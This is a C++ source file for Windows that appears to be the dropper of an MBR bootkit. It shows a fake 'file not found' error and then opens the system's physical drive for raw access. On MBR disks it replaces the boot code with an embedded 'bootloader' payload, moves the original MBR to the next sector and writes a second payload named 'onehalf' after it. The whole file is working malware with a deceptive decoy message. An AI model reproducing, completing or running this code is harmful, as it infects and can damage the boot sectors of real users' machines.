#include <Windows.h>
#include <shlwapi.h>
#include <iostream>
#include "data.h"

#pragma comment(lib, "Shlwapi.lib")

void main()
{
	char msg[MAX_PATH];
	char filename[MAX_PATH];
	GetModuleFileNameA(0,filename,sizeof(filename));
	PathRemoveExtensionA(filename);

	wsprintfA(msg, "\nERROR: File is not found: %s.DEV\n", filename);
    	printf(msg);
	DWORD wb;
	VOLUME_DISK_EXTENTS diskExtents;
	char buffer[6];
	char system[MAX_PATH];
    	GetSystemDirectoryA(system, sizeof(system));
	char path[] = "\\\\.\\";
	char NUL[] = "\0";

	memcpy(buffer + 0, path + 0, 4);
	memcpy(buffer + 4, system + 0, 2);
    	memcpy(buffer + 6, NUL + 0, 1);

	HANDLE LogicalDrive = CreateFileA(buffer, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (LogicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}
 
    	DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0,0, &diskExtents, sizeof(diskExtents), &wb, NULL);

	CloseHandle(LogicalDrive);
	
	char physicaldevice[] = "\\\\.\\PhysicalDrive";
 
    	char buf[19];

	char number[2] = {0x00, 0x00};
	wsprintfA(number, "%d", diskExtents.Extents[0].DiskNumber);
	memcpy(buf + 0, physicaldevice, 17);
	memcpy(buf + 17, number, 2);

	HANDLE PhysicalDrive = CreateFileA(buf, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);

	if (PhysicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}
	
	PARTITION_INFORMATION_EX info;
	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, 0,0, &info, sizeof(info), &wb, NULL);

	if(info.PartitionStyle == PARTITION_STYLE_MBR)
	{
		char oldMbr[512];
		char NewMbr[512];
        	char CmpMBR[440];
		BYTE cleansignature[2] = {0x00, 0x00};
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, oldMbr, 512, &wb, NULL);
        	memcpy(CmpMBR + 0,oldMbr + 0,440);
        	if(memcmp(CmpMBR,bootloader,440)==0) { ExitProcess(0);} else {
		memcpy(NewMbr,bootloader,512);
		memcpy(NewMbr + 440, oldMbr + 440, 70);
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, NewMbr, 512, &wb, NULL);
		//
		memcpy(oldMbr + 510, cleansignature, 2);
		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, oldMbr, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, 1024,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, onehalf, 512, &wb, NULL);
		CloseHandle(PhysicalDrive);
		ExitProcess(0);
	    }
	}
	else if(info.PartitionStyle == PARTITION_STYLE_GPT)
	{
		CloseHandle(PhysicalDrive);
		ExitProcess(0);
	}
}